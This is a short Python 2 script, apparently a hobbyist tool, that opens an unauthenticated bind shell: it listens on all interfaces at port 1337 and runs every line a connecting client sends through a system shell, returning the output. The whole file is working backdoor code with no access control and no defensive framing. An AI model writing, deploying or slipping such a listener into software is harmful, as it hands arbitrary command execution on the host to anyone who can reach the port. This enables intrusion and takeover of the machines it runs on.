#! /usr/bin/python
#######Server code for remote shell  #########
#################Coded By: Jagmohan Singh#################################
########for use : See README####################
import socket
import os
import threading
import getopt
import sys
import subprocess
global command  
global bind_ip 
global bind_port 
#global output
#output=""
def server_connect():
	bind_ip="0.0.0.0" ####Ip address of the server in context to itself for binding		
	bind_port=1337   ##Port numbe on which servers accepts the connection
	server=socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##creating a TCP socket for connection
	server.bind((bind_ip,bind_port))   ##Binding the ip address and port with socket
	server.listen(5)	####maximum 5 number of connection to be handeled by server simultaneously
	while (1):     
		client_socket,addr=server.accept()        ####accepting connection on the socket
		client_thread=threading.Thread(target=handle_client,args=(client_socket,addr))	
		client_thread.start()
		print "listening from %s:%s "%(addr[0],addr[1])
def run_command(command):    ###function to run the command and return the output
	command=command.rstrip()  	
	process = subprocess.Popen(command, shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)

# wait for the process to terminate
	out, err = process.communicate() ##output or error based on the input command
	if(err):
		return err.strip('\n')
	else:
		return out.strip('\n')


def handle_client(client_socket,addr): ####function to handle the output and input for client
	while (1):
		cmd_buffer=""
		while "\n" not in cmd_buffer:    ######getting the whole command input from client
			cmd_buffer+=client_socket.recv(1024)
		print "command to execute %s from client %s:%s"	%(cmd_buffer,addr[0],addr[1])  
		response = run_command(cmd_buffer) #response of command after being run on the server
		try:
			client_socket.send(response)  ###sending the response back to client
			print "sending the data %s" %response
		except:
			print "send failed"

server_connect()	      ####main function to execute
